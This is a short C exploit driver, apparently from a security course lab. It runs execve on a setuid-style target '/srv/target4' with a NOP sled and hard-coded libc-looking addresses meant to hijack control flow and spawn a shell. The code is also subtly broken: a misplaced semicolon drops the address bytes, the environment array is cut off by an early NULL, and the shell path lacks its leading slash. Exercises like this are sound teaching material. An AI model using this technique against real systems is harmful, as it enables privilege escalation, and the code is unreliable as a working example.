#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target4"

int main(void)
{
  char *args[3];
  char *env[2];

  args[0] = TARGET;
  args[1] = "\x90\x90\x90\x90\x90\x90\x90\x90";
            "\x60\x43\xe1\xf7"
            "\xc0\x6e\xe0\xf7"
            "\x63\xf3\xf5\xf7";
  args[2] = NULL;

  env[0] = NULL;
  env[1] = "bin/zsh";

  printf("Calling execve with target: %s\n", TARGET);
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}